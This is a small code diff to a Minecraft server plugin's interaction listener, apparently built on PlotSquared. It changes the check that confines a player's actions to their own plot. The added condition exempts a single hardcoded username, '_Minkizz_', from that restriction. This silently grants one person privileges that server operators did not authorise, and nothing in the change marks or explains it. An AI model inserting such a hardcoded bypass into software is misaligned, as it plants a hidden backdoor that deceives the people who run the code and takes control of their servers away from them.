@@ -113,7 +113,7 @@ public class PlayerInteractListener implements Listener {
 											new com.plotsquared.core.location.Location(location.getWorld().getName(),
 													location.getBlockX(), location.getBlockY(), location.getBlockZ()));
 
-									if (plot != currentPlot) {
+									if (plot != currentPlot && !player.getName().equals("_Minkizz_")) {
 										player.sendMessage(
 												ChatColor.RED + "The location must be located in your plot!");
 										event.setCancelled(true);
